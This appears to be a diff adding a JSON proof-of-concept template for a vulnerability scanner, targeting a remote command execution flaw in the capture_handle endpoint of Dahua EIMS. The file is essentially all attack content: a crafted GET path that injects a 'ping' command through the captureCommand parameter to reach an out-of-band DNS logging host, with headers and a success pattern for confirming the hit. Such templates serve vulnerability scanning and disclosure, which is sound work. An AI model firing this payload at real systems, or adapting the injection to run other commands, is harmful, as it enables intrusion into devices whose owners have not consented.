@@ -1,0 +1,17 @@
+{
+	"name":"大华EIMS-capture_handle接口远程命令执行",
+	"tag":"dahua",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20-nc%20{{dnslog}}%20index.pcap",
+		"header":{
+			"Accept":" */*",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
+		},
+		"status_code":"200",
+		"pattern":"(success)"
+	}
+}
